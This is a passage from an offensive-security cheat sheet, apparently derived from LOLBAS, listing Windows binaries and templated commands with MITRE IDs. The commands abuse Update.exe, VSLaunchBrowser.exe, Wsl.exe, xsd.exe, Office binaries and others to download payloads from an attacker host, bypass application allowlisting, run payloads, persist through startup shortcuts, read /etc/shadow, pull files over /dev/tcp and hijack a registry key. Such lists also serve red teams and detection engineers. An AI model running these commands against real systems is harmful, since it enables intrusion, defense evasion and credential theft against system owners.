*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas The above binary will go to url and look for RELEASES file and download the nuget package"
Update.exe --download $scheme://$lhost:$lport/$file
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
-->

### Update.exe AWL Bypass #2

The above binary will go to url and look for RELEASES file, download and install the nuget package.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas The above binary will go to url and look for RELEASES file, download and install the nuget package"
Update.exe --update=$scheme://$lhost:$lport/$file
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
-->

### Update.exe Execute #3

The above binary will go to url and look for RELEASES file, download and install the nuget package.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas The above binary will go to url and look for RELEASES file, download and install the nuget package"
Update.exe --update=$scheme://$lhost:$lport/$file
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
-->

### Update.exe AWL Bypass #4

The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas Update.exe AWL Bypass #4"
Update.exe --update=\\$lhost\$share\$file
```
<!-- cheat
import tun_ip
var file
var share
-->

### Update.exe Execute #5

The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas Update.exe Execute #5"
Update.exe --update=\\$lhost\$share\$file
```
<!-- cheat
import tun_ip
var file
var share
-->

### Update.exe AWL Bypass #6

The above binary will go to url and look for RELEASES file, download and install the nuget package.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas The above binary will go to url and look for RELEASES file, download and install the nuget package"
Update.exe --updateRollback=$scheme://$lhost:$lport/$file
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
-->

### Update.exe Execute #7

The above binary will go to url and look for RELEASES file, download and install the nuget package.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas The above binary will go to url and look for RELEASES file, download and install the nuget package"
Update.exe --updateRollback=$scheme://$lhost:$lport/$file
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
-->

### Update.exe AWL Bypass #8

Copy your payload into %userprofile%\AppData\Local\Microsoft\Teams\current\. Then run the command. Update.exe will execute the file you copied.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas Copy your payload into %userprofile%\AppData\Local\Microsoft\Teams\current\"
Update.exe --processStart $file_out --process-start-args "$cmd"
```
<!-- cheat
var cmd
var file_out
-->

### Update.exe AWL Bypass #9

The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas Update.exe AWL Bypass #9"
Update.exe --updateRollback=\\$lhost\$share\$file
```
<!-- cheat
import tun_ip
var file
var share
-->

### Update.exe Execute #10

The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas Update.exe Execute #10"
Update.exe --updateRollback=\\$lhost\$share\$file
```
<!-- cheat
import tun_ip
var file
var share
-->

### Update.exe Execute #11

Copy your payload into %userprofile%\AppData\Local\Microsoft\Teams\current\. Then run the command. Update.exe will execute the file you copied.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas Copy your payload into %userprofile%\AppData\Local\Microsoft\Teams\current\"
Update.exe --processStart $file_out --process-start-args "$cmd"
```
<!-- cheat
var cmd
var file_out
-->

### Update.exe Execute #12

Copy your payload into "%localappdata%\Microsoft\Teams\current\". Then run the command. Update.exe will create a shortcut to the specified executable in "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup". Then payload will run on every login of the user who runs it.

*Privileges: User • MITRE: T1547*

```cmd title:"Lolbas Copy your payload into '%localappdata%\Microsoft\Teams\current\'"
Update.exe --createShortcut=$file_out -l=Startup
```
<!-- cheat
var file_out
-->

### Update.exe Execute #13

Run the command to remove the shortcut created in the "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" directory you created with the LolBinExecution "--createShortcut" described on this page.

*Privileges: User • MITRE: T1070*

```cmd title:"Lolbas Update.exe Execute #13"
Update.exe --removeShortcut=$file_out-l=Startup
```
<!-- cheat
var file_out
-->

## Visio.exe

Microsoft Visio Executable

**Path(s):**
- `C:\Program Files (x86)\Microsoft Office\Office14\Visio.exe`
- `C:\Program Files\Microsoft Office\Office14\Visio.exe`
- `C:\Program Files (x86)\Microsoft Office\Office15\Visio.exe`
- `C:\Program Files\Microsoft Office\Office15\Visio.exe`
- `C:\Program Files (x86)\Microsoft Office\Office16\Visio.exe`
- `C:\Program Files\Microsoft Office\Office16\Visio.exe`
- `C:\Program Files (x86)\Microsoft Office\root\Office14\Visio.exe`
- `C:\Program Files\Microsoft Office\root\Office14\Visio.exe`
- `C:\Program Files (x86)\Microsoft Office\root\Office15\Visio.exe`
- `C:\Program Files\Microsoft Office\root\Office15\Visio.exe`
- `C:\Program Files (x86)\Microsoft Office\root\Office16\Visio.exe`
- `C:\Program Files\Microsoft Office\root\Office16\Visio.exe`

### Visio.exe Download

Downloads payload from remote server

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas Downloads payload from remote server"
Visio.exe $scheme://$lhost:$lport/$file
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
-->

## VisualUiaVerifyNative.exe

A Windows SDK binary for manual and automated testing of Microsoft UI Automation implementation and controls.

**Path(s):**
- `c:\Program Files (x86)\Windows Kits\10\bin\<version>\arm64\UIAVerify\VisualUiaVerifyNative.exe`
- `c:\Program Files (x86)\Windows Kits\10\bin\<version>\x64\UIAVerify\VisualUiaVerifyNative.exe`
- `c:\Program Files (x86)\Windows Kits\10\bin\<version>\UIAVerify\VisualUiaVerifyNative.exe`

### VisualUiaVerifyNative.exe AWL Bypass

Generate Serialized gadget and save to - `C:\Users\%USERNAME%\AppData\Roaminguiverify.config` before executing.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas VisualUiaVerifyNative.exe AWL Bypass"
VisualUiaVerifyNative.exe
```
<!-- cheat
-->

## VSDiagnostics.exe

Command-line tool used for performing diagnostics.

**Path(s):**
- `C:\Program Files\Microsoft Visual Studio\2022\Community\Team Tools\DiagnosticsHub\Collector\VSDiagnostics.exe`

### VSDiagnostics.exe Execute #1

Starts a collection session with sessionID 1 and calls kernelbase.CreateProcessW to launch specified executable.

*Privileges: User • MITRE: T1127*

```cmd title:"Lolbas VSDiagnostics.exe Execute #1"
VSDiagnostics.exe start 1 /launch:$file_out
```
<!-- cheat
var file_out
-->

### VSDiagnostics.exe Execute #2

Starts a collection session with sessionID 2 and calls kernelbase.CreateProcessW to launch specified executable. Arguments specified in launchArgs are passed to CreateProcessW.

*Privileges: User • MITRE: T1127*

```cmd title:"Lolbas VSDiagnostics.exe Execute #2"
VSDiagnostics.exe start 2 /launch:$file_out /launchArgs:"$cmd"
```
<!-- cheat
var cmd
var file_out
-->

## Vshadow.exe

VShadow is a command-line tool that can be used to create and manage volume shadow copies.

**Path(s):**
- `C:\Program Files (x86)\Windows Kits\10\bin\<version>\x64\vshadow.exe`

### Vshadow.exe Execute

Executes specified executable from vshadow.exe.

*Privileges: Administrator • MITRE: T1202*

```cmd title:"Lolbas Executes specified executable from vshadow.exe"
vshadow.exe -nw -exec=$file_out C:
```
<!-- cheat
var file_out
-->

## VSIISExeLauncher.exe

Binary will execute specified binary. Part of VS/VScode installation.

**Path(s):**
- `C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\Common7\IDE\Extensions\Microsoft\Web Tools\ProjectSystem\VSIISExeLauncher.exe`

### VSIISExeLauncher.exe Execute

The above binary will execute other binary.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas The above binary will execute other binary"
VSIISExeLauncher.exe -p $file_out -a "$cmd"
```
<!-- cheat
var cmd
var file_out
-->

## vsjitdebugger.exe

Just-In-Time (JIT) debugger included with Visual Studio

**Path(s):**
- `c:\windows\system32\vsjitdebugger.exe`

### vsjitdebugger.exe Execute

Executes specified executable as a subprocess of Vsjitdebugger.exe.

*Privileges: User • MITRE: T1127*

```cmd title:"Lolbas Executes specified executable as a subprocess of Vsjitdebugger.exe"
Vsjitdebugger.exe $file_out
```
<!-- cheat
var file_out
-->

## VSLaunchBrowser.exe

Microsoft Visual Studio browser launcher tool for web applications debugging

**Path(s):**
- `C:\Program Files\Microsoft Visual Studio\<version>\Community\Common7\IDE\VSLaunchBrowser.exe`
- `C:\Program Files (x86)\Microsoft Visual Studio\<version>\Community\Common7\IDE\VSLaunchBrowser.exe`

### VSLaunchBrowser.exe Download #1

Download and execute payload from remote server

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas Download and execute payload from remote server"
VSLaunchBrowser.exe .exe $scheme://$lhost:$lport/$file
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
-->

### VSLaunchBrowser.exe Execute #2

Execute payload via VSLaunchBrowser as parent process

*Privileges: User • MITRE: T1127*

```cmd title:"Lolbas Execute payload via VSLaunchBrowser as parent process"
VSLaunchBrowser.exe .exe $file_out
```
<!-- cheat
var file_out
-->

### VSLaunchBrowser.exe Execute #3

Execute payload from WebDAV server via VSLaunchBrowser as parent process

*Privileges: User • MITRE: T1127*

```cmd title:"Lolbas Execute payload from WebDAV server via VSLaunchBrowser as parent process"
VSLaunchBrowser.exe .exe \\$lhost\$share\$file
```
<!-- cheat
import tun_ip
var file
var share
-->

## vsls-agent.exe

Agent for Visual Studio Live Share (Code Collaboration)

**Path(s):**
- `c:\Program Files (x86)\Microsoft Visual Studio\2019\Professional\Common7\IDE\Extensions\Microsoft\LiveShare\Agent\vsls-agent.exe`

### vsls-agent.exe Execute

Load a library payload using the --agentExtensionPath parameter (32-bit)

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas Load a library payload using the --agentExtensionPath parameter (32-bit)"
vsls-agent.exe --agentExtensionPath $file_out
```
<!-- cheat
var file_out
-->

## vstest.console.exe

VSTest.Console.exe is the command-line tool to run tests

**Path(s):**
- `C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\IDE\CommonExtensions\Microsoft\TestWindow\vstest.console.exe`
- `C:\Program Files (x86)\Microsoft Visual Studio\2022\TestAgent\Common7\IDE\CommonExtensions\Microsoft\TestWindow\vstest.console.exe`

### vstest.console.exe AWL Bypass

VSTest functionality may allow an adversary to executes their malware by wrapping it as a test method then build it to a .exe or .dll file to be later run by vstest.console.exe. This may both allow AWL bypass or defense bypass in general

*Privileges: User • MITRE: T1127*

```cmd title:"Lolbas vstest.console.exe AWL Bypass"
vstest.console.exe $file_out
```
<!-- cheat
var file_out
-->

## Wfc.exe

The Workflow Command-line Compiler tool is included with the Windows Software Development Kit (SDK).

**Path(s):**
- `C:\Program Files (x86)\Microsoft SDKs\Windows\v10.0A\bin\NETFX 4.8 Tools\wfc.exe`

### Wfc.exe AWL Bypass

Execute arbitrary C# code embedded in a XOML file.

*Privileges: User • MITRE: T1127*

```cmd title:"Lolbas Execute arbitrary C# code embedded in a XOML file"
wfc.exe $file_out
```
<!-- cheat
var file_out
-->

## WFMFormat.exe

Command-line tool used for pretty-print a dump file generated by Message Farm Analyzer tool.

**Path(s):**
- `C:\there\is\no\default\installation\path\WFMFormat.exe`

### WFMFormat.exe Execute

Executes the file `tracerpt.exe` in the same folder as `WFMFormat.exe`. If the file `dumpfile.txt` (any content) exists in the current working directory, no arguments are required. Note that `WFMFormat.exe` requires .NET Framework 3.5.

*Privileges: User • MITRE: T1127*

```cmd title:"Lolbas Executes the file tracerpt.exe in the same folder as WFMFormat.exe"
WFMFormat.exe
```
<!-- cheat
-->

## WinDbg.exe

Windows Debugger for advanced user-mode and kernel-mode debugging.

**Path(s):**
- `C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\windbg.exe`
- `C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\windbg.exe`
- `C:\Program Files (x86)\Windows Kits\10\Debuggers\arm\windbg.exe`
- `C:\Program Files (x86)\Windows Kits\10\Debuggers\arm64\windbg.exe`

### WinDbg.exe Execute

Launches a command line through the debugging process; optionally add `-G` to exit the debugger automatically.

*Privileges: User • MITRE: T1127*

```cmd title:"Lolbas WinDbg.exe Execute"
windbg.exe -g $cmd
```
<!-- cheat
var cmd
-->

## winfile.exe

Windows File Manager executable

**Path(s):**
- `C:\Windows\System32\winfile.exe`
- `C:\Windows\winfile.exe`
- `C:\Program Files\WinFile\winfile.exe`
- `C:\Program Files (x86)\WinFile\winfile.exe`
- `C:\Program Files\WindowsApps\Microsoft.WindowsFileManager_10.3.0.0_x64__8wekyb3d8bbwe\WinFile\winfile.exe`

### winfile.exe Execute

Execute an executable file with WinFile as a parent process.

*Privileges: User • MITRE: T1202*

```cmd title:"Lolbas Execute an executable file with WinFile as a parent process"
winfile.exe $file_out
```
<!-- cheat
var file_out
-->

## WinProj.exe

Microsoft Project Executable

**Path(s):**
- `C:\Program Files (x86)\Microsoft Office\Office14\WinProj.exe`
- `C:\Program Files\Microsoft Office\Office14\WinProj.exe`
- `C:\Program Files (x86)\Microsoft Office\Office15\WinProj.exe`
- `C:\Program Files\Microsoft Office\Office15\WinProj.exe`
- `C:\Program Files (x86)\Microsoft Office\Office16\WinProj.exe`
- `C:\Program Files\Microsoft Office\Office16\WinProj.exe`
- `C:\Program Files (x86)\Microsoft Office\root\Office14\WinProj.exe`
- `C:\Program Files\Microsoft Office\root\Office14\WinProj.exe`
- `C:\Program Files (x86)\Microsoft Office\root\Office15\WinProj.exe`
- `C:\Program Files\Microsoft Office\root\Office15\WinProj.exe`
- `C:\Program Files (x86)\Microsoft Office\root\Office16\WinProj.exe`
- `C:\Program Files\Microsoft Office\root\Office16\WinProj.exe`

### WinProj.exe Download

Downloads payload from remote server

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas Downloads payload from remote server"
WinProj.exe $scheme://$lhost:$lport/$file
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
-->

## Winword.exe

Microsoft Office binary

**Path(s):**
- `C:\Program Files\Microsoft Office\root\Office16\winword.exe`
- `C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\winword.exe`
- `C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\winword.exe`
- `C:\Program Files (x86)\Microsoft Office\Office16\winword.exe`
- `C:\Program Files\Microsoft Office\Office16\winword.exe`
- `C:\Program Files (x86)\Microsoft Office 15\ClientX86\Root\Office15\winword.exe`
- `C:\Program Files\Microsoft Office 15\ClientX64\Root\Office15\winword.exe`
- `C:\Program Files (x86)\Microsoft Office\Office15\winword.exe`
- `C:\Program Files\Microsoft Office\Office15\winword.exe`
- `C:\Program Files (x86)\Microsoft Office 14\ClientX86\Root\Office14\winword.exe`
- `C:\Program Files\Microsoft Office 14\ClientX64\Root\Office14\winword.exe`
- `C:\Program Files (x86)\Microsoft Office\Office14\winword.exe`
- `C:\Program Files\Microsoft Office\Office14\winword.exe`
- `C:\Program Files (x86)\Microsoft Office\Office12\winword.exe`
- `C:\Program Files\Microsoft Office\Office12\winword.exe`
- `C:\Program Files\Microsoft Office\Office12\winword.exe`

### Winword.exe Download

Downloads payload from remote server

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas Downloads payload from remote server"
winword.exe $scheme://$lhost:$lport/$file
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
-->

## Wsl.exe

Windows subsystem for Linux executable

**Path(s):**
- `C:\Windows\System32\wsl.exe`

### Wsl.exe Execute #1

Executes calc.exe from wsl.exe

*Privileges: User • MITRE: T1202*

```cmd title:"Lolbas Executes calc.exe from wsl.exe"
wsl.exe -e /mnt/c/Windows/System32/calc.exe
```
<!-- cheat
-->

### Wsl.exe Execute #2

Cats /etc/shadow file as root

*Privileges: User • MITRE: T1202*

```cmd title:"Lolbas Cats /etc/shadow file as root"
wsl.exe -u root -e cat /etc/shadow
```
<!-- cheat
-->

### Wsl.exe Execute #3

Executes Linux command (for example via bash) as the default user (unless stated otherwise using `-u <username>`) on the default WSL distro (unless stated otherwise using `-d <distro name>`)

*Privileges: User • MITRE: T1202*

```cmd title:"Lolbas Execute Linux command through WSL"
wsl.exe --exec bash -c "$cmd"
```
<!-- cheat
var cmd
-->

### Wsl.exe Download #4

Downloads file from $lhost

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas Downloads file from 192.168.1.10"
wsl.exe --exec bash -c 'cat < /dev/tcp/$lhost/54 > binary'
```
<!-- cheat
import tun_ip
-->

### Wsl.exe Execute #5

When executed, `wsl.exe` queries the registry value of `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Lxss\MSI\InstallLocation`, which contains a folder path (`c:\program files\wsl` by default). If the value points to another folder containing a file named `wsl.exe`, it will be executed instead of the legitimate `wsl.exe` in the program files folder.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas Wsl.exe Execute #5"
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Lxss\MSI\InstallLocation" /ve /d "$file_in" /f
wsl.exe
```
<!-- cheat
var file_in
-->

## XBootMgr.exe

Windows Performance Toolkit binary used to start performance traces.

**Path(s):**
- `C:\Program Files\Windows Kits\10\Windows Performance Toolkit\xbootmgr.exe`
- `C:\Program Files (x86)\Windows Kits\10\Windows Performance Toolkit\xbootmgr.exe`

### XBootMgr.exe Execute #1

Executes an executable after the trace is complete using the callBack parameter.

*Privileges: Administrator • MITRE: T1202*

```cmd title:"Lolbas Executes an executable after the trace is complete using the callBack parameter"
xbootmgr.exe -trace "$boot_hibernate_standby_shutdown_rebootcycle" -callBack $file_out
```
<!-- cheat
var boot_hibernate_standby_shutdown_rebootcycle
var file_out
-->

### XBootMgr.exe Execute #2

Executes an executable before each trace run using the preTraceCmd parameter.

*Privileges: Administrator • MITRE: T1202*

```cmd title:"Lolbas Executes an executable before each trace run using the preTraceCmd parameter"
xbootmgr.exe -trace "$boot_hibernate_standby_shutdown_rebootcycle" -preTraceCmd $file_out
```
<!-- cheat
var boot_hibernate_standby_shutdown_rebootcycle
var file_out
-->

## XBootMgrSleep.exe

Windows Performance Toolkit binary used for tracing and analyzing system performance during sleep and resume transitions.

**Path(s):**
- `C:\Program Files\Windows Kits\10\Windows Performance Toolkit\xbootmgrsleep.exe`
- `C:\Program Files (x86)\Windows Kits\10\Windows Performance Toolkit\xbootmgrsleep.exe`

### XBootMgrSleep.exe Execute

Execute executable via XBootMgrSleep, with a 1 second (=1000 milliseconds) delay. Alternatively, it is also possible to replace the delay with any string for immediate execution.

*Privileges: User • MITRE: T1202*

```cmd title:"Lolbas Execute executable via XBootMgrSleep, with a 1 second (=1000 milliseconds) delay"
xbootmgrsleep.exe 1000 $file_out
```
<!-- cheat
var file_out
-->

## xsd.exe

XML Schema Definition Tool included with the Windows Software Development Kit (SDK).

**Path(s):**
- `C:\Program Files (x86)\Microsoft SDKs\Windows\<version>\bin\NETFX <version> Tools\xsd.exe`

### xsd.exe Download

Downloads payload from remote server

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas Downloads payload from remote server"
xsd.exe $scheme://$lhost:$lport/$file
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
-->

# Honorable Mentions

## code.exe

VSCode binary, also portable (CLI) version

**Path(s):**
- `C:\Users\<username>\AppData\Local\Programs\Microsoft VS Code\Code.exe`
- `C:\Program Files\Microsoft VS Code\Code.exe`
- `C:\Program Files (x86)\Microsoft VS Code\Code.exe`

### code.exe Execute

Starts a reverse PowerShell connection over global.rel.tunnels.api.visualstudio.com via websockets; command

*Privileges: User • MITRE: T1219.001*

```cmd title:"Lolbas code.exe Execute"
code.exe tunnel --accept-server-license-terms --name "tunnel-name"
```
<!-- cheat
-->

## GfxDownloadWrapper.exe

Remote file download used by the Intel Graphics Control Panel, receives as first parameter a URL and a destination file path.

**Path(s):**
- `c:\windows\system32\driverstore\filerepository\64kb6472.inf_amd64_3daef03bbe98572b\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\cui_comp.inf_amd64_0e9c57ae3396e055\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\cui_comp.inf_amd64_209bd95d56b1ac2d\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\cui_comp.inf_amd64_3fa2a843f8b7f16d\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\cui_comp.inf_amd64_85c860f05274baa0\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\cui_comp.inf_amd64_f7412e3e3404de80\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\cui_comp.inf_amd64_feb9f1cf05b0de58\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\cui_component.inf_amd64_0219cc1c7085a93f\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\cui_component.inf_amd64_df4f60b1cae9b14a\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\cui_dc_comp.inf_amd64_16eb18b0e2526e57\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\cui_dc_comp.inf_amd64_1c77f1231c19bc72\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\cui_dc_comp.inf_amd64_31c60cc38cfcca28\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\cui_dc_comp.inf_amd64_82f69cea8b2d928f\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\cui_dc_comp.inf_amd64_b4d94f3e41ceb839\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\cui_dch.inf_amd64_0606619cc97463de\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\cui_dch.inf_amd64_0e95edab338ad669\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\cui_dch.inf_amd64_22aac1442d387216\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\cui_dch.inf_amd64_2461d914696db722\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\cui_dch.inf_amd64_29d727269a34edf5\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\cui_dch.inf_amd64_2caf76dbce56546d\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\cui_dch.inf_amd64_353320edb98da643\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\cui_dch.inf_amd64_4ea0ed0af1507894\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\cui_dch.inf_amd64_56a48f4f1c2da7a7\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\cui_dch.inf_amd64_64f23fdadb76a511\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\cui_dch.inf_amd64_668dd0c6d3f9fa0e\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\cui_dch.inf_amd64_6be8e5b7f731a6e5\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\cui_dch.inf_amd64_6dad7e4e9a8fa889\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\cui_dch.inf_amd64_6df442103a1937a4\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\cui_dch.inf_amd64_767e7683f9ad126c\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\cui_dch.inf_amd64_8644298f665a12c4\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\cui_dch.inf_amd64_868acf86149aef5d\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\cui_dch.inf_amd64_92cf9d9d84f1d3db\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\cui_dch.inf_amd64_93239c65f222d453\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\cui_dch.inf_amd64_9de8154b682af864\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\cui_dch.inf_amd64_a7428663aca90897\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\cui_dch.inf_amd64_ad7cb5e55a410add\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\cui_dch.inf_amd64_afbf41cf8ab202d7\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\cui_dch.inf_amd64_d193c96475eaa96e\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\cui_dch.inf_amd64_db953c52208ada71\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\cui_dch.inf_amd64_e7523682cc7528cc\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\cui_dch.inf_amd64_e9f341319ca84274\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\cui_dch.inf_amd64_f3a64c75ee4defb7\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\cui_dch.inf_amd64_f51939e52b944f4b\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\cui_dch_comp.inf_amd64_4938423c9b9639d7\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\cui_dch_comp.inf_amd64_c8e108d4a62c59d5\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\cui_dch_comp.inf_amd64_deecec7d232ced2b\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_01ee1299f4982efe\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_02edfc87000937e4\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_0541b698fc6e40b0\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_0707757077710fff\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_0b3e3ed3ace9602a\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_0cff362f9dff4228\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_16ed7d82b93e4f68\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_1a33d2f73651d989\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_1aca2a92a37fce23\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_1af2dd3e4df5fd61\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_1d571527c7083952\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_23f7302c2b9ee813\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_24de78387e6208e4\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_250db833a1cd577e\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_25e7c5a58c052bc5\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_28d80681d3523b1c\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_2dda3b1147a3a572\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_31ba00ea6900d67d\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_329877a66f240808\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_42af9f4718aa1395\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_4645af5c659ae51a\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_48c2e68e54c92258\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_48e7e903a369eae2\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_491d20003583dabe\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_4b34c18659561116\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_51ce968bf19942c2\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_555cfc07a674ecdd\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_561bd21d54545ed3\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_579a75f602cc2dce\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_57f66a4f0a97f1a3\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_587befb80671fb38\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_62f096fe77e085c0\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_6ae0ddbb4a38e23c\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_6bb02522ea3fdb0d\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_6d34ac0763025a06\GfxDownloadWrapper.exe`
- `c:\windows\system32\driverstore\filerepository\igdlh64.inf_amd64_712b6a0adbaabc0a\GfxDownloadWrapper.exe`
